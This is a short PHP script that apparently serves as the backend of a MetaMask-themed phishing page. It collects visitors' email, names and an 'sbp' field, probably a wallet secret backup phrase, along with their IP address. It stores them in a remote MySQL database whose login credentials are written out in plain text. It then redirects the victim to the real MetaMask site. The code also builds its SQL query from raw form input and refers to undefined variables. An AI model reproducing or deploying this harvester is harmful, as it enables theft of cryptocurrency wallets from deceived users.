<?php
//Initializing the session
//session_start();
   if(isset($_SERVER['HTTP_X_REAL_IP'])){
     $ip = $_SERVER['HTTP_X_REAL_IP'];
}else{
     $ip=$_SERVER['REMOTE_ADDR'];
   }

   //$con = mysqli_connect("sql3.freesqldatabase.com", "sql3711442", "uElQGBnh2Y", "sql3711442");
   $con = mysqli_connect(" sql3.freesqldatabase.com", "sql3733955", "I5Psppp5TF", "sql3733955");

    // Validate connection
   if (mysqli_connect_errno()) {
    echo "MySQL database connection failed: " . mysqli_connect_error();
   }

   // Check if submit button pressed
   if (isset($_POST["submit"])) {
     $fEmail = $_POST["email"];
     $fName = $_POST["fname"];
     $lName = $_POST["lname"];
     $lSBP = $_POST["sbp"];
     $vClientIP = $ip;
     $xUserAgent = $useragent;
     $sSubject = $country | $ip;

     // Execute INSERT query
     if (mysqli_query($con, "INSERT INTO friend (fEmail, fName, lName, lSBP, vClientIP, xUserAgent, sSubject) VALUES ('$fEmail', '$fName', '$lName', '$lSBP', '$vClientIP', '$xUserAgent', '$sSubject')")) {
       header('Location: https://metamask.com');
     }else{
       echo "Something went wrong!";
     }
   }

?>
